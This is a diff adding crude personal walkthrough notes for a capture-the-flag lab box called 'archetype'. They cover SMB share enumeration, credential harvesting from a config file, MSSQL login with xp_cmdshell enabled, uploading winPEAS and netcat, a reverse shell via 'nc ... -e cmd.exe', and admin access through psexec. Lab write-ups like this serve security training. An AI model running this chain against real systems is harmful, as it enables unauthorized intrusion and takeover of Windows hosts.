@@ -1,0 +1,46 @@
+archetype
+|
+|
+-do nmap scan first
+|
+-you get sql on 1433 and netbios
+|
+-for netbois do the smb shid with smbclient
+-smbclient \\\\machineip
+-you cant get into shid
+-for listing shares do smbclient -N -L \\\\10.129.19.170\\ 
+-where -N means no pass and -L means list
+|note:admin shares end with $ liek ADMIN$
+|
+-google the answers and shid for most of this shid
+|
+-execute ms sql cmd :xp_cmdshell { 'command_string' } [ , no_output ]
+|
+-you will get a non admin user login using smb client using that
+-you will get a weird prod.XXXX file get that
+-in that there will be password and username for some user 
+-use that with impacket mssqlclient.py script to login liek
+-python3 mssqlclient.py ARCHETYPE/username@ip -windows-auth
+-giev that password
+|note:dont put ARCHETYPE\username shit will get fking stroke for some reason
+-you will get a sql shell if success
+-note:use a sql cheat sheet else lmao
+|
+-for executing cmd line commands use xp_cmdshell cmd to execute commands
+-note:enable the xp_cmdshell first
+|
+-download winpeas.bat
+-since yer connected to it user python http server to host file
+-and download file to c:/users/public on the target cause everything else is lmao no
+|
+-download nc sem way on target and use nc <yer own ip> 4444 -e cmd.exe
+note:start listening on yer own machine first using nc -lnvp 4444
+- you will get a reverse shell
+-now cat the file you got when you did winpeas you will get password for the admin account
+-from impacket use psexec.py administrator@targetip
+-giev password
+-now you admin
+|
+-cat the user.txt in user file
+-cat the root flag in admin desktop
+|
